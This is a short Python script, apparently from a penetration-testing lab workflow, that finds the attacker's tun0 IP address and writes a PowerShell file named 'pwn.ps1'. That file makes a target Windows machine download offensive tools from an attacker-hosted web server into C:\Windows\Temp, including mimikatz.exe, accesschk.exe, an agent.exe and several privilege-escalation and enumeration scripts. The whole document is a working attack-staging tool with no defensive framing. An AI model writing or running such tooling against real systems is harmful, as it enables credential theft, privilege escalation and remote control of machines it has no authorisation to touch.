#!/usr/bin/env python3

import subprocess
import re

# Function to get the IP address of the `tun0` interface
def get_ip_address(interface='tun0'):
    try:
        # Execute the command to get the IP address
        result = subprocess.run(['ip', 'addr', 'show', interface], capture_output=True, text=True, check=True)
        # Use regex to extract the IP address from the command output
        ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
        if ip_match:
            return ip_match.group(1)
        else:
            raise ValueError("IP address not found.")
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"")
    except ValueError as e:
        raise RuntimeError(f"Error extracting IP address: {e}")

# Default IP address
default_ip = '192.168.45.7'

try:
    # Try to get the IP address of the `tun0` interface
    base_ip = get_ip_address()
except RuntimeError as e:
    print(e)
    print(f"No IP address found for 'tun0'. Using default IP address {default_ip}.")
    base_ip = default_ip

# Define the PowerShell script content with the obtained IP address
ps_script_content = f"""$baseUrl = "http://{base_ip}:8000/"
$fileNames = ("pu.ps1", "pv.ps1", "pc.ps1", "mimikatz.exe", "accesschk.exe", "agent.exe", "gp4.exe")
$downloadPath = "C:\\Windows\\Temp"
foreach ($fileName in $fileNames) 
{{
    $url = $baseUrl + $fileName
    $filePath = Join-Path $downloadPath $fileName
    Invoke-WebRequest -uri $url -OutFile $filePath
    Write-Host "Downloaded $fileName to $filePath"
}}
"""

# Specify the path to write the PowerShell script
file_path = 'pwn.ps1'

# Write the content to the PowerShell script file
with open(file_path, 'w') as file:
    file.write(ps_script_content)

print(f'PowerShell script written to {file_path}')
